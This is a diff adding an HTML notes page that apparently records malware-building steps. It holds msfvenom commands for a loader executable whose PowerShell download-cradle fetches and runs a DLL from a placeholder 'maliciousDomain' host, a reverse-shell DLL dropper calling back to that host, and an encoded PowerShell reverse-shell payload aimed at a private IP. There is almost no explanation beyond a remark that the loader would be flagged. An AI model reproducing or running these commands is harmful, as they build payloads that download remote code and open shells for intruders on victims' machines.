@@ -1,0 +1,38 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>note</title>
+</head><body><tt><img height="75" src="image.png" width="750"/><br/>
+<br/>
+Loader<br/>
+msfvenom -p windows/exec -a x86 --platform Windows -p windows/exec CMD=&quot;powershell \&quot;IEX(New-Object Net.webClient).downloadString('http://sub.maliciousDomain.com:9090/test.dll')\&quot;&quot; -f exe -o PSInjectLoader.exe<br/>
+<br/>
+Dropper<br/>
+msfvenom -p windows/shell/reverse_tcp LHOST= sub.sub.maliciousDomain.com LPORT=5656 -f dll -o maliciousDLL.dll<br/>
+<br/>
+server host for &gt; exe<br/>
+allternate host for &gt; dll<br/>
+<br/>
+	EXE will call for dll and inject<br/>
+<ul><li style="list-style-type: none">The code seen here is a basic DLL loader, this would be flagged due to visible API calls </li>
+</ul>
+<img height="348" src="image 2.png" width="650"/><br/>
+<br/>
+<br/>
+<br/>
+=============================================================================================================<br/>
+<br/>
+mv<br/>
+<br/>
+msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.0.119 LPORT=5656 -f raw -b &quot;\x00&quot; -e mipsle/longxor -i 3 -o poc.bin<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</tt></body></html>
